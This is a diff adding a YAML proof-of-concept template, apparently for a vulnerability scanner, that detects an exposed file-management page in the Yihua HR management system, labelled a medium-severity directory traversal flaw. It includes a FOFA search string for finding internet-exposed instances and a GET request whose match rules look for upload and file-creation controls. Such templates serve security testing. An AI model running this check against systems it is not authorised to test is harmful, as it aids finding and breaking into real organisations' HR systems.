@@ -1,0 +1,15 @@
+id: poc-yaml-yihua-hr-ms-filemanage-directory-traversal
+info:
+  name: 亿华人力资源管理系统 filemanage 目录遍历漏洞
+  severity: medium
+  tags:
+  - 目录遍历
+  finger: 亿华考勤系统
+  fofa: body="亿华人力资源管理系统"
+requests:
+- method: GET
+  path: /filemanage/file/default.aspx
+  expression: "status_code == 200 && \ncontains(title,\"EHR -- 文件管理\") &&\ncontains(body,\"\
+    上传文件\") &&\ncontains(body,\"新建目录\") &&\ncontains(body,\"新建文件\")\n"
+variables: {}
+transport: http
